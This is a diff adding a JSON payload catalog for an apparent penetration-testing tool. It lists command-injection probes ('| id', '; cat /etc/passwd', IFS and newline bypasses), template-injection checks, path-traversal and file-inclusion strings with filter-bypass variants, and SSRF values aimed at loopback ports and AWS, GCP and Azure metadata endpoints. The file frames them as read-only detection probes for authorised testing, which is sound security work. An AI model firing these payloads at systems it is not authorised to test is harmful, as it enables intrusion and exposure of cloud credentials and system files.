@@ -1,0 +1,57 @@
+{
+  "schema_version": "1.1.1",
+  "tool": "mitr3-live-browser",
+  "consumer": "run_intruder / load_intruder_payloads (merged with the diagnostic catalog by the loader)",
+  "purpose": "DECLARATIVE probe values with real detection fidelity — read-only commands, static paths, approved canaries; every hit requires independent verification; never a confirmed vulnerability",
+  "updated": "2026-11-12",
+  "status": "OPERATOR_APPROVED — dj via VANTA dispatch 2026-11-11 (Intruder-Lite support); dj recalibration word 2026-11-11: payloads must have real pentest detection value ('use o que realmente vão ajudar a gente a encontrar vulnerabilidades')",
+  "placeholders": {
+    "{token}": "per-run random hex marker (run_intruder); payloads echo it with the MITR3_ prefix so marker_observed fires on reflection",
+    "{canary}": "operator-approved public HTTPS canary URL, validated by _validate_ssrf_canary; used whole — never prefixed or rewritten"
+  },
+  "rules": [
+    "dedupe: entries duplicating values already in the primary catalog (rce_id_subst, rce_printf_* marker echo, lfi_passwd_absolute, lfi_php_filter, ssrf_canary_plain) were removed — the db keeps precedence and the probe budget is not burned twice",
+    "payloads stay READ-ONLY and diagnostic — that is what detection requires: no destructive command, no write path, no log poisoning, no gopher/dict scheme bridging",
+    "command payloads target high-signal output the signature DB already detects (id, uname, passwd) or reflect the run marker",
+    "SSTI arithmetic probes (7*7=49) are marker-free: operator verifies the reflected result in the probe body",
+    "values must be safe to render on an operator screen (no raw credentials, no exploit scaffolding)",
+    "ssrf payloads never target private/reserved hosts except the loopback/metadata diagnostics that are part of the check itself"
+  ],
+  "intruder_payloads": {
+    "rce": [
+      { "id": "rce_id_pipe", "value": "| id", "detects": ["unix_id_pattern"] },
+      { "id": "rce_id_backtick", "value": "`id`", "detects": ["unix_id_pattern"] },
+      { "id": "rce_id_amp", "value": "&& id", "detects": ["unix_id_pattern"] },
+      { "id": "rce_id_or", "value": "|| id", "detects": ["unix_id_pattern"] },
+      { "id": "rce_id_newline", "value": "\nid", "detects": ["unix_id_pattern"], "notes": "newline separator bypasses space/semicolon filters after one decode" },
+      { "id": "rce_id_ifs", "value": "| ${IFS}id", "detects": ["unix_id_pattern"], "notes": "IFS bypass for space-filtered injections" },
+      { "id": "rce_uname_subst", "value": "$(uname -a)", "detects": ["uname_banner", "uname_compile_triplet"] },
+      { "id": "rce_passwd_cat", "value": "; cat /etc/passwd", "detects": ["unix_passwd_entry"] },
+      { "id": "rce_ssti_jinja", "value": "{{7*7}}", "detects": [], "notes": "reflected 49 = SSTI; verify arithmetic result in probe body" },
+      { "id": "rce_ssti_spring", "value": "${7*7}", "detects": [], "notes": "Spring/EL or JS template engines" },
+      { "id": "rce_ssti_eruby", "value": "<%= 7*7 %>", "detects": [], "notes": "ERB/eRuby engines" }
+    ],
+    "lfi": [
+      { "id": "lfi_passwd_dotslash", "value": "....//....//....//....//etc/passwd", "detects": ["unix_passwd_entry"], "notes": "bypasses naive '../' stripping" },
+      { "id": "lfi_passwd_encoded", "value": "%2e%2e%2fetc%2fpasswd", "detects": ["unix_passwd_entry"], "notes": "single-depth encoded variant; survives filters that block '../' before decoding" },
+      { "id": "lfi_passwd_null", "value": "../../../../../etc/passwd\u0000.png", "detects": ["unix_passwd_entry"], "notes": "legacy null-byte truncation (PHP < 5.3.4 only)" },
+      { "id": "lfi_data_scheme_marker", "value": "data://text/plain,MITR3_{token}", "detects": [], "notes": "data:// included + marker echoed = allow_url_include proven" },
+      { "id": "lfi_file_scheme_passwd", "value": "file:///etc/passwd", "detects": ["unix_passwd_entry"] },
+      { "id": "lfi_proc_version", "value": "/proc/self/version", "detects": ["uname_banner"] },
+      { "id": "lfi_proc_cmdline", "value": "/proc/self/cmdline", "detects": [], "notes": "running command line leaks app runtime paths" },
+      { "id": "lfi_hostname", "value": "../../../../../etc/hostname", "detects": [], "notes": "benign read proving arbitrary path control" },
+      { "id": "lfi_win_ini", "value": "../../../../../../windows/win.ini", "detects": [], "notes": "Windows targets; check [fonts]/[extensions] sections" }
+    ],
+    "ssrf": [
+      { "id": "ssrf_canary_token_query", "value": "{canary}?{token}", "detects": [], "notes": "token in query distinguishes this probe from ssrf_canary_path (token in path)" },
+      { "id": "ssrf_loopback_80", "value": "http://127.0.0.1:80/", "detects": ["loopback_banner", "ssrf_refused_loopback"] },
+      { "id": "ssrf_loopback_ssh_22", "value": "http://127.0.0.1:22/", "detects": [], "notes": "SSH-2.0 banner in body = internal port open" },
+      { "id": "ssrf_loopback_8080", "value": "http://localhost:8080/", "detects": ["loopback_banner"] },
+      { "id": "ssrf_ipv6_loopback", "value": "http://[::1]:80/", "detects": [], "notes": "IPv6 loopback often unfiltered when v4 is blocked" },
+      { "id": "ssrf_aws_metadata", "value": "http://169.254.169.254/latest/meta-data/", "detects": ["aws_imds_listing", "metadata_ip_reflection"] },
+      { "id": "ssrf_gcp_metadata", "value": "http://metadata.google.internal/computeMetadata/v1/", "detects": [], "notes": "403 confirms internal DNS resolution even without Metadata-Flavor header" },
+      { "id": "ssrf_azure_metadata", "value": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "detects": ["azure_imds_fields"] },
+      { "id": "ssrf_file_scheme", "value": "file:///etc/hostname", "detects": [], "notes": "fetch function allowing file:// = direct scheme bridge" }
+    ]
+  }
+}
